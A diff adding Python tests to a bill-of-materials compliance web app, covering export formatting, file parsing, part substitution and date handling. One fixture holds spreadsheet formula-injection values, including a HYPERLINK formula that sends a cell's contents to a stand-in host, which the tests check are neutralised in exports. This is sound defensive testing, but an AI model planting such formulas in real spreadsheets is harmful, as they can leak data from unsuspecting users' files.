@@ -1489,3 +1489,185 @@ def test_unexpected_server_error_gives_a_clear_answer(monkeypatch):
     assert r.json()["detail"].startswith("Server error")
     # Expected errors keep their own status and message
     assert client.get("/api/components/999999").status_code == 404
+
+
+# ------------------------------------------------------------------ fixes from the end-to-end tests
+
+FORMULA_BOM = (
+    'Designator;Manufacturer;MPN;Description\n'
+    'U1;Texas Instruments;LM358DR;=HYPERLINK("http://example.invalid/?"&A2,"Datasheet")\n'
+    'U2;Acme;=1+1;-12V converter\n'
+    'U3;@SUM(1+1);+XYZ;-5\n'
+)
+
+
+def test_exports_never_contain_formulas():
+    # Excel report: no formula cell, the text is kept as written
+    import openpyxl
+    xlsx = client.post("/api/analyze?format=xlsx", files={"file": ("f.csv", FORMULA_BOM.encode())}).content
+    wb = openpyxl.load_workbook(io.BytesIO(xlsx))
+    assert not [c.coordinate for ws in wb.worksheets for row in ws.iter_rows() for c in row if c.data_type == "f"]
+    values = [c.value for row in wb["Detail"].iter_rows() for c in row]
+    assert "=1+1" in values and '=HYPERLINK("http://example.invalid/?"&A2,"Datasheet")' in values
+    # CSV report and modified BOM: cells that a spreadsheet would evaluate start with an apostrophe
+    report = client.post("/api/analyze?format=csv", files={"file": ("f.csv", FORMULA_BOM.encode())}).content.decode("utf-8-sig")
+    assert "'=1+1" in report and "'+XYZ" in report and "'-12V converter" in report and "'@SUM(1+1)" in report
+    assert ";-5;" in report  # a signed number stays a number
+    lm = comp_id("LM358DR")
+    bom = client.post("/api/analyze?format=bom", files={"file": ("f.csv", FORMULA_BOM.encode())},
+                      data={"substitutions": json.dumps({"3": lm})}).content.decode("utf-8-sig")
+    assert "'=HYPERLINK" in bom and "'@SUM(1+1)" in bom
+    # Database export
+    client.post("/api/components", json={"mpn": "FORMULA-1", "manufacturer": "Acme", "description": "=1+2", "source": "@SUM(1)"})
+    export = client.get("/api/components/export").content.decode("utf-8-sig")
+    assert "'=1+2" in export and "'@SUM(1)" in export
+
+
+def test_csv_with_any_line_endings():
+    bom = "Designator;Manufacturer;MPN;Description\rU1;Texas Instruments;LM358DR;op-amp\rU2;Murata;GRM188R71H104KA93D;cap\r"
+    for text in (bom, bom.replace("\r", "\r\n"), "Designator;Manufacturer;MPN;Description\r\nU1;Texas Instruments;LM358DR;op-amp\rdual\r\n"):
+        r = client.post("/api/analyze", files={"file": ("mac.csv", text.encode())})
+        assert r.status_code == 200, (text, r.text)
+        assert r.json()["lines"][0]["bom_mpn"] == "LM358DR"
+    assert [l["bom_mpn"] for l in analyze_text(bom)["lines"]] == ["LM358DR", "GRM188R71H104KA93D"]
+    # A binary file renamed .csv: a clear message, not a server error
+    r = client.post("/api/analyze", files={"file": ("photo.csv", b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x01")})
+    assert r.status_code == 422 and "neither a text table" in r.json()["detail"]
+    r = client.post("/api/components/import", files={"file": ("mac.csv", "mpn;manufacturer\rMAC-1;Acme\r".encode())})
+    assert r.status_code == 200 and r.json()["created"] == 1
+
+
+def test_downloads_with_any_file_name():
+    from urllib.parse import quote
+    for name in ("物料清单.csv", "Схема_платы.csv", "bom_Ω.csv"):
+        for fmt in ("xlsx", "csv", "bom"):
+            r = client.post(f"/api/analyze?format={fmt}", files={"file": (name, b"MPN;Manufacturer\nNE555P;Texas Instruments\n")})
+            assert r.status_code == 200, (name, fmt, r.text)
+            assert quote(name.rsplit(".", 1)[0], safe="") in r.headers["content-disposition"]
+            assert "filename*=UTF-8''" in r.headers["content-disposition"]
+    c, _ = new_client_with_account()
+    hid = c.post("/api/analyze", files={"file": ("物料清单.csv", b"MPN\nNE555P\n")}, data={"save": "1"}).json()["history_id"]
+    r = c.get(f"/api/history/{hid}/file")
+    assert r.status_code == 200 and r.content == b"MPN\nNE555P\n"
+
+
+def test_excel_sheet_holding_the_bom_is_read():
+    import openpyxl
+
+    def workbook(build) -> bytes:
+        wb = openpyxl.Workbook()
+        build(wb)
+        buf = io.BytesIO()
+        wb.save(buf)
+        return buf.getvalue()
+
+    def cover_first(wb):
+        cover = wb.active
+        cover.title = "Cover"
+        for row in (["Project", "Sensor board"], ["Revision", "B"], ["Author", "QA"]):
+            cover.append(row)
+        bom = wb.create_sheet("BOM")
+        bom.append(["Designator", "Qty", "Manufacturer", "Manufacturer Part Number", "Description"])
+        bom.append(["U1", 1, "Texas Instruments", "LM358DR", "Op-amp"])
+        bom.append(["C1", 1, "Murata", "GRM188R71H104KA93D", "Cap"])
+
+    def hidden_lists_first(wb):
+        lists = wb.active
+        lists.title = "Lists"
+        for row in (["Status"], ["Compliant"], ["Non-compliant"]):
+            lists.append(row)
+        lists.sheet_state = "hidden"
+        bom = wb.create_sheet("BOM")
+        bom.append(["Designator", "Manufacturer", "Manufacturer Part Number"])
+        bom.append(["U1", "Texas Instruments", "LM358DR"])
+
+    for build, mpns in ((cover_first, ["LM358DR", "GRM188R71H104KA93D"]), (hidden_lists_first, ["LM358DR"])):
+        r = client.post("/api/analyze", files={"file": ("book.xlsx", workbook(build))})
+        assert r.status_code == 200, (build.__name__, r.text)
+        assert [line["bom_mpn"] for line in r.json()["lines"]] == mpns
+
+
+def test_replacement_does_not_keep_the_statuses_declared_for_the_original_part():
+    ao = comp_id("AO3400A")
+    bom = "Designator;Manufacturer;MPN;Description;RoHS;REACH\nQ1;Acme;ACME-MOSFET-1;MOSFET N-Channel 30V SOT-23;Compliant;Compliant\n"
+    line = analyze_text(bom, substitutions=json.dumps({"2": ao}))["lines"][0]
+    assert line["bom_mpn"] == "AO3400A" and line["from_bom"] == []
+    with db.session() as conn:
+        base = conn.execute("SELECT reach FROM components WHERE id = ?", (ao,)).fetchone()[0]
+    assert line["reach"] == ("needs_review" if base == "unknown" else base)
+    # Reverse case: a non-compliance declared for the replaced part does not follow the replacement
+    yageo = comp_id("CC0603KRX7R9BB104")
+    bom = "Designator;Manufacturer;MPN;Description;RoHS\nC1;Murata;GRM188R71H104KA93D;Capacitor 100 nF;no\nC2;Yageo;CC0603KRX7R9BB104;Capacitor 100 nF;\n"
+    lines = analyze_text(bom, substitutions=json.dumps({"2": yageo}))["lines"]
+    assert lines[0]["rohs3"] == lines[1]["rohs3"] == "compliant"
+    # Modified BOM: the declared statuses of a replaced row are emptied
+    out = client.post("/api/analyze?format=bom", files={"file": ("b.csv", bom.encode())},
+                      data={"substitutions": json.dumps({"2": yageo})}).content.decode("utf-8-sig").splitlines()
+    assert out[1].split(";")[4] == "" and out[1].endswith("GRM188R71H104KA93D (Murata)")
+
+
+def test_status_given_by_hand_follows_the_part_reviewed():
+    bom = "Designator;Manufacturer;MPN;Alternate MPN;Description\nU1;Acme;XYZ-PRIMARY-1;XYZ-ALTERNATE-1;Sensor\n"
+    manual = json.dumps({"2": {"rohs3": "compliant", "mpn": "XYZ-PRIMARY-1"}})
+    line = analyze_text(bom, classifications=manual)["lines"][0]
+    assert (line["rohs3"], line["manual"]) == ("compliant", ["rohs3"])
+    # Another part number column: the new part is judged on its own
+    other = analyze_text(bom, classifications=manual, mapping=json.dumps({"mpn": "Alternate MPN"}))["lines"][0]
+    assert (other["bom_mpn"], other["rohs3"], other["manual"]) == ("XYZ-ALTERNATE-1", "needs_review", [])
+    # Replacement by an equivalent: same
+    lm = comp_id("LM358DR")
+    replaced = analyze_text(bom, classifications=manual, substitutions=json.dumps({"2": lm}))["lines"][0]
+    assert replaced["bom_mpn"] == "LM358DR" and replaced["manual"] == []
+    # Statuses saved without a part number (older history entries) still apply by line
+    assert analyze_text(bom, classifications=json.dumps({"2": {"rohs3": "compliant"}}))["lines"][0]["manual"] == ["rohs3"]
+    r = client.post("/api/analyze", files={"file": ("b.csv", bom.encode())}, data={"classifications": json.dumps({"2": {"mpn": 3}})})
+    assert r.status_code == 400
+
+
+def test_rohs2_inferred_from_the_rohs3_declared_in_the_bom():
+    rep = analyze_text("MPN;Manufacturer;RoHS\nXYZ-NOT-IN-DB-1;Acme;Compliant\nXYZ-NOT-IN-DB-2;Acme;RoHS3 Compliant\n")
+    for line in rep["lines"]:
+        assert (line["rohs3"], line["rohs2"], line["rohs2_inferred"]) == ("compliant", "compliant", True)
+        assert "rohs2" not in line["review"]
+    assert rep["summary"]["rohs2"]["verdict"] == rep["summary"]["rohs3"]["verdict"] == "compliant"
+    line = analyze_text("MPN;Manufacturer;RoHS 2\nXYZ-NOT-IN-DB-3;Acme;Not RoHS Compliant\n")["lines"][0]
+    assert (line["rohs2"], line["rohs3"], line["rohs3_inferred"]) == ("non_compliant", "non_compliant", True)
+
+
+def test_exemption_list_with_unknown_codes_of_any_shape():
+    client.post("/api/components", json={"mpn": "EXEMPT-TYPO-1", "manufacturer": "Acme", "rohs2": "exemption", "rohs_exemptions": "15(b)"})
+    client.post("/api/components", json={"mpn": "EXEMPT-TYPO-2", "manufacturer": "Acme", "rohs2": "exemption", "rohs_exemptions": "TBD"})
+    r = client.get("/api/exemptions")
+    assert r.status_code == 200, r.text
+    keys = [e["key"] for e in r.json()["exemptions"]]
+    assert {"15B", "TBD"} <= set(keys) and keys.index("15B") < keys.index("TBD")
+
+
+def test_page_has_no_duplicate_ids():
+    # Two elements with the same id: the script reaches the wrong one (the component form emptied the
+    # Manufacturers tab through a shared "mfrList" id)
+    import re
+    page = client.get("/").text
+    ids = re.findall(r'\bid="([^"]+)"', page)
+    assert sorted({i for i in ids if ids.count(i) > 1}) == []
+    assert 'list="mfrOptions"' in page and 'id="mfrOptions"' in page
+
+
+def test_last_checked_dates_normalised(tmp_path):
+    imp = ("Référence fabricant;Fabricant;Désignation;RoHS 2;RoHS 3;REACH;Date\n"
+           "DATE-FR-1;Date Test Ltd;Capacitor 100 nF 0402;Oui;Oui;Conforme;03/10/2026\n")
+    r = client.post("/api/components/import", files={"file": ("dates.csv", imp.encode())})
+    assert r.status_code == 200 and r.json()["created"] == 1, r.text
+    comp = client.get("/api/components", params={"q": "DATE-FR-1"}).json()["items"][0]
+    assert comp["last_checked"] == "2026-10-03"  # day first, stored YYYY-MM-DD (shown by the date field)
+    r = client.post("/api/components", json={"mpn": "DATE-BAD-1", "manufacturer": "Acme", "last_checked": "yesterday-ish"})
+    assert r.status_code == 422 and "Invalid date" in r.json()["detail"]
+    # Dates stored as written by older versions are converted at start-up
+    path = tmp_path / "old.db"
+    with db.session(path) as conn:
+        conn.execute("INSERT INTO components (mpn, mpn_norm, mpn_loose, manufacturer, manufacturer_norm, last_checked, updated_at) "
+                     "VALUES ('OLD-1', 'OLD1', 'OLD1', 'Acme', 'acme', '10.03.2026', '')")
+        conn.execute("INSERT INTO components (mpn, mpn_norm, mpn_loose, manufacturer, manufacturer_norm, last_checked, updated_at) "
+                     "VALUES ('OLD-2', 'OLD2', 'OLD2', 'Acme', 'acme', 'soon', '')")
+    with db.session(path) as conn:
+        assert dict(conn.execute("SELECT mpn, last_checked FROM components").fetchall()) == {"OLD-1": "2026-03-10", "OLD-2": "soon"}
